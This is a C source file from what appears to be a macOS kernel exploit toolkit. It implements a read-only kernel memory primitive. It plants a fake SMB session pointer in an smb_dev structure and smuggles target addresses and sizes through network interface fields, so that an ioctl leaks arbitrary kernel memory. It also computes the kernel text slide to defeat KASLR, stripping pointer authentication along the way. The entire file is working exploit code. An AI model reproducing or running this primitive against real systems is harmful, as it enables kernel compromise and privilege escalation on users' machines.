//
//  kmem_ro.c
//  xe_kmem
//
//  Created by admin on 2/23/22.
//

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_internal.h>
#include <xe/util/assert.h>
#include <xe/util/log.h>
#include <xe/util/ptrauth.h>
#include <macos_params.h>

#include "smb/client.h"
#include "smb/params.h"

#include "kmem_ro.h"
#include "smb_dev_rw.h"
#include "fake_session.h"


#define MAX_READ_SIZE 128 * 1024 * 1024


struct kmem_ro {
    struct sockaddr_in smb_addr;
    smb_dev_rw_t dev_rw;
    fake_session_t fake_session;
};


int kmem_ro_try_read(struct kmem_ro* kmem, void* dst, uintptr_t src, uint32_t size) {
    int fd = smb_dev_get_active_dev(kmem->dev_rw);
    
    int error = smb_client_ioc_auth_info(fd, NULL, UINT32_MAX, NULL, UINT32_MAX, NULL);
    if (error == EINVAL) {
        return error;
    }
    xe_assert_err(error);
    
    struct network_nic_info nic_info;
    bzero(&nic_info, sizeof(nic_info));
    nic_info.nic_index = FAKE_SESSION_NIC_INDEX;
    nic_info.nic_link_speed = ((uint64_t)size) << 32;
    nic_info.nic_caps = (uint32_t)((uintptr_t)src);
    nic_info.nic_type = (uint32_t)((uintptr_t)src >> 32);
    memcpy(&nic_info.addr, &FAKE_SESSION_NIC_SADDR, sizeof(FAKE_SESSION_NIC_SADDR));
    
    error = smb_client_ioc_update_client_interface(fd, &nic_info, 1);
    xe_assert_err(error);
    
    error = smb_client_ioc_auth_info(fd, dst, size, NULL, UINT32_MAX, NULL);
    if (error == EINVAL) {
        return error;
    }
    xe_assert_err(error);
    return 0;
}


_Bool kmem_ro_can_read(struct kmem_ro* kmem) {
    xe_assert(kmem->dev_rw != NULL);
    
    if (!kmem->fake_session) {
        return FALSE;
    }
    
    struct smb_dev smb_dev;
    smb_dev_rw_read(kmem->dev_rw, &smb_dev);
    xe_assert_kaddr((uintptr_t)smb_dev.sd_devfs);
    
    char data[16];
    if (kmem_ro_try_read(kmem, data, (uintptr_t)smb_dev.sd_devfs, sizeof(data))) {
        return FALSE;
    } else {
        return TRUE;
    }
}


void kmem_ro_setup_new_fake_session(struct kmem_ro* kmem) {
    xe_assert(kmem->dev_rw != NULL);
    if (kmem->fake_session) {
        fake_session_destroy(&kmem->fake_session);
    }
    kmem->fake_session = fake_session_create(&kmem->smb_addr);
    
    struct smb_dev smb_dev;
    smb_dev_rw_read(kmem->dev_rw, &smb_dev);
    xe_assert_kaddr((uintptr_t)smb_dev.sd_devfs);
    
    smb_dev.sd_session = (struct smb_session*)fake_session_get_addr(kmem->fake_session);
    smb_dev_rw_write(kmem->dev_rw, &smb_dev);
}


void kmem_ro_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xe_assert_cond(size, <=, MAX_READ_SIZE);
    
    struct kmem_ro* kmem = (struct kmem_ro*)ctx;
    while (TRUE) {
        int error = kmem_ro_try_read(kmem, dst, src, (uint32_t)size);
        if (error) {
            xe_log_warn("kmem_ro read failed, retrying with new fake session");
            kmem_ro_setup_new_fake_session(kmem);
        } else {
            break;
        }
    }
}


void kmem_ro_write(void* ctx, uintptr_t src, void* dst, size_t size) {
    xe_log_error("kmem_ro does not support read");
    abort();
}


static const struct xe_kmem_ops kmem_ro_ops = {
    .read = kmem_ro_read,
    .write = kmem_ro_write,
    .max_read_size = MAX_READ_SIZE,
    .max_write_size = 0
};


xe_kmem_backend_t kmem_ro_create(const struct sockaddr_in* smb_addr) {
    struct kmem_ro* kmem = malloc(sizeof(struct kmem_ro));
    bzero(kmem, sizeof(*kmem));
    
    kmem->smb_addr = *smb_addr;
    kmem->dev_rw = smb_dev_rw_create(smb_addr);
    kmem_ro_setup_new_fake_session(kmem);
    
    while (!kmem_ro_can_read(kmem)) {
        xe_log_warn("kmem_ro fake session setup failed, retrying...");
        kmem_ro_setup_new_fake_session(kmem);
    }
    
    return xe_kmem_backend_create(&kmem_ro_ops, kmem);
}

uintptr_t kmem_ro_get_mach_execute_header(xe_kmem_backend_t backend) {
    struct kmem_ro* kmem = (struct kmem_ro*)xe_kmem_backend_get_ctx(backend);
    struct smb_dev smb_dev;
    smb_dev_rw_read(kmem->dev_rw, &smb_dev);
    
    uintptr_t devfs = (uintptr_t)smb_dev.sd_devfs;
    uintptr_t de_dnp = xe_kmem_read_uint64(devfs, TYPE_DEVDIRENT_MEM_DE_DNP_OFFSET);
    uintptr_t dn_ops = xe_kmem_read_uint64(de_dnp, TYPE_DEVNODE_MEM_DN_OPS_OFFSET);
    uintptr_t vn_default_error = xe_ptrauth_strip(xe_kmem_read_uint64(xe_kmem_read_uint64(dn_ops, 0), 0));
    
    int64_t text_exec_slide = vn_default_error - FUNC_VN_DEFAULT_ERROR;
    xe_assert_cond(text_exec_slide, >=, 0);
    uintptr_t text_exec_base = XE_IMAGE_SEGMENT_TEXT_EXEC_BASE + text_exec_slide;
    uintptr_t text_base = text_exec_base - XE_IMAGE_SEGMENT_TEXT_SIZE;
    return text_base;
}

void kem_ro_destroy(xe_kmem_backend_t* backend_p) {
    xe_log_error("todo");
    abort();
}
